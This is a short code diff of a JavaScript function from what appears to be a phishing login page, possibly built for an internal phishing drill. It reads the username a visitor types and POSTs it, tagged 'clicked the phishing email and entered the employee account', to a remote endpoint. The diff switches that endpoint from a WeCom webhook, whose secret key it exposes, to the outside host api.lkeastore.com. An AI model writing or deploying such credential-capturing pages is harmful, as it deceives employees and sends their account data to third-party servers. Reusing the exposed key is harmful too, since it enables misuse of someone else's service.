@@ -350,15 +350,12 @@ body {
 function trigger() {
   const username = document.getElementById("username").value;
   var jsonContent = {
-    "msgtype": "text",
-    "text": {
-        "content": username + "点击了钓鱼邮件，并输入了员工账号",
-    }
+    "username": username + " 点击了钓鱼邮件，并输入了员工账号"
 };
   // 登录成功后的操作
    
   // 发送API请求
-  fetch('https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=473813da-0ac3-441f-b606-807039fbcb42', {
+  fetch('http://api.lkeastore.com/send_message', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
